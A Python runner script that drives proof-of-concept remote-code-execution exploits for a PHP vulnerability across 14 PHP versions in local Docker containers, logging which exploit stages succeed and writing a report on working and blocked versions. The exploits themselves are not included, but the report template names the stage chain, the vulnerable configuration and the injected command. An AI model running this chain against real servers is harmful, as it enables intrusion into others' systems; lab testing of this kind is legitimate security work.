#!/usr/bin/env python3
"""php2shell master runner — tests all 14 versions in sequence.

For each version:
  1. Run poc/poc_<ver>.py
  2. Log output to results/<ver>.log
  3. Record RCE proven / failed + blocker stage

After all 14: write REPORT.md with the full table.

Usage:
    python run_all.py              # run all 14 (sequential, ~2-5 min each)
    python run_all.py --only 8426,8511   # run specific versions only
    python run_all.py --retries 5        # more retries per stage
    python run_all.py --loop             # repeat forever (12h continuous)
"""
import argparse
import json
import os
import subprocess
import sys
import time
from datetime import datetime

BASE = os.path.dirname(os.path.abspath(__file__))
POC_DIR = os.path.join(BASE, "poc")
RESULTS_DIR = os.path.join(BASE, "results")
REPORT = os.path.join(BASE, "REPORT.md")
os.makedirs(RESULTS_DIR, exist_ok=True)

sys.path.insert(0, BASE)
from versions import VERSIONS, KNOWN_BLOCKED


def run_one(ver: str, port: int, container: str, retries: int) -> dict:
    """Run a single PoC and return the result dict."""
    tag = ver.replace(".", "")
    poc_path = os.path.join(POC_DIR, f"poc_{tag}.py")
    log_path = os.path.join(RESULTS_DIR, f"{tag}.log")

    result = {
        "ver": ver, "port": port, "container": container,
        "rce": False, "stage": "unknown", "time_s": 0,
        "timestamp": datetime.now().isoformat(),
    }

    t0 = time.time()
    try:
        r = subprocess.run(
            [sys.executable, poc_path],
            capture_output=True, text=True, timeout=1800,
        )
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT (1800s)"
        r = None
    except Exception as e:
        out = f"ERROR: {e}"
        r = None
    result["time_s"] = time.time() - t0

    # Write log
    with open(log_path, "w", encoding="utf-8") as f:
        f.write(f"=== php2shell PoC {ver} ({container}:{port}) ===\n")
        f.write(f"timestamp: {result['timestamp']}\n")
        f.write(f"duration: {result['time_s']:.1f}s\n")
        f.write(f"returncode: {r.returncode if r else 'N/A'}\n")
        f.write(f"--- output ---\n")
        f.write(out)
        f.write(f"\n--- end ---\n")

    # Parse result
    if "RCE PROVEN" in out:
        result["rce"] = True
        result["stage"] = "OK"
    elif "HEAP_LEAK_FAILED" in out:
        result["stage"] = "stage-1"
    elif "LIBPHP_LEAK_FAILED" in out:
        result["stage"] = "stage-2"
    elif "EXPLOIT_FAILED" in out:
        result["stage"] = "stage-3"
    elif "TIMEOUT" in out:
        result["stage"] = "timeout"
    elif "ERROR" in out:
        result["stage"] = "error"

    status = "[+] RCE" if result["rce"] else f"[-] {result['stage']}"
    print(f"  {ver:8s} {container:10s} {result['time_s']:7.1f}s  {status}", flush=True)
    return result


def write_report(results: list[dict], iterations: int) -> None:
    """Write REPORT.md with the full table."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    proven = [r for r in results if r["rce"]]
    score = len(proven)

    lines = [
        f"# php2shell (EDB 52704 / CVE-2026-109618/109619) — Cross-Version RCE Report",
        "",
        f"**Generated:** {now}  ",
        f"**Iterations:** {iterations}  ",
        f"**Score:** {score}/14 RCE proven",
        "",
        "## Results",
        "",
        "| PHP    | container | port  | RCE   | Blocker stage | Time (s) | Known cause |",
        "|--------|-----------|-------|-------|---------------|----------|-------------|",
    ]
    for r in results:
        known = KNOWN_BLOCKED.get(r["ver"], "")
        rce = "✅" if r["rce"] else "❌"
        stage = r["stage"] if not r["rce"] else "—"
        lines.append(
            f"| {r['ver']:6s} | {r['container']:10s} | {r['port']} | {rce} | {stage:14s} | {r['time_s']:6.1f} | {known} |"
        )

    lines += [
        "",
        "## RCE Proven",
        "",
    ]
    if proven:
        for r in proven:
            lines.append(f"- **{r['ver']}** ({r['container']}, port {r['port']}) — proof: `id` → `/www/p1`")
    else:
        lines.append("- (none this run)")

    lines += [
        "",
        "## Blocker Analysis",
        "",
        "| Family | Versions | Root cause |",
        "|--------|----------|------------|",
        "| Broken A (per-field limit) | 7.4.33, 8.2.34 | ~1.9MB `ZEND_MM_MAX_LARGE_SIZE` drops the 12MB OOM field → no OOM → no stage-1 leak |",
        "| Broken B (stage-3 mis-land) | 8.3.35 | stage-1+2 work, but carrier lands at R+0xfd8 (pad-independent) → no RCE |",
        "| No-SYS_PTRACE | 5.4.45–8.1.32 | /proc/<worker>/mem denied → cannot verify heap; stage-1 leak also fails |",
        "| Working | 8.4.26, 8.5.11 | full chain works → RCE proven |",
        "",
        "## PoC Files",
        "",
        "Each version has a standalone PoC in `poc/`:",
        "",
    ]
    for r in results:
        tag = r["ver"].replace(".", "")
        lines.append(f"- `poc/poc_{tag}.py` — PHP {r['ver']} ({r['container']}, port {r['port']})")

    lines += [
        "",
        "## Reproduction",
        "",
        "```bash",
        "# Single version:",
        "python poc/poc_8426.py",
        "",
        "# All 14 (sequential):",
        "python run_all.py",
        "",
        "# Continuous (12h loop):",
        "python run_all.py --loop",
        "```",
        "",
        "## Environment",
        "",
        "- Host: Windows (WSL2), Docker",
        "- One `php:<ver>-apache` container per version, single-worker prefork",
        "- Config: `display_errors=1 memory_limit=8M max_input_vars=1000 session.use_cookies=1 session.use_strict_mode=0 session.upload_progress.enabled=1`",
        "- Exploit: `exploit.py` (bookworm profile, carrier mode)",
        "- Command: `id>/www/p1` (max 14 bytes), proof via `GET /p1`",
        "",
    ]

    with open(REPORT, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"\n[+] Report written to {REPORT}", flush=True)


def main() -> int:
    ap = argparse.ArgumentParser(description="php2shell master runner")
    ap.add_argument("--only", default="", help="comma-separated tags to run (e.g. 8426,8511)")
    ap.add_argument("--retries", type=int, default=3, help="retries per stage")
    ap.add_argument("--loop", action="store_true", help="repeat forever")
    ap.add_argument("--skip-proven", action="store_true", help="skip versions already proven")
    args = ap.parse_args()

    # Filter versions
    if args.only:
        tags = set(args.only.split(","))
        versions = [v for v in VERSIONS if v[0].replace(".", "") in tags]
    else:
        versions = VERSIONS

    print(f"[*] php2shell master runner — {len(versions)} versions", flush=True)
    print(f"[*] retries per stage: {args.retries}", flush=True)
    if args.loop:
        print(f"[*] LOOP MODE: running continuously", flush=True)

    iteration = 0
    all_results = []
    while True:
        iteration += 1
        if args.loop and iteration > 1:
            print(f"\n{'='*60}", flush=True)
            print(f"[*] ITERATION {iteration}", flush=True)
            print(f"{'='*60}", flush=True)

        print(f"\n[*] Iteration {iteration} — {datetime.now().strftime('%H:%M:%S')}", flush=True)
        results = []
        for ver, port, container, zif, dtor, htdata, s1n, s2t, s2v, carrier in versions:
            r = run_one(ver, port, container, args.retries)
            results.append(r)

        all_results.extend(results)

        if not args.loop:
            break

        # In loop mode, write report after each iteration
        write_report(results, iteration)
        # Sleep briefly between iterations
        time.sleep(2)

    if not args.loop:
        write_report(results, 1)

    # Final score
    proven = [r for r in all_results if r["rce"]]
    unique_proven = set(r["ver"] for r in proven)
    print(f"\n{'='*60}", flush=True)
    print(f"[*] FINAL: {len(unique_proven)}/14 RCE proven across {iteration} iteration(s)", flush=True)
    for v in sorted(unique_proven):
        print(f"    [+] {v}", flush=True)
    print(f"{'='*60}", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
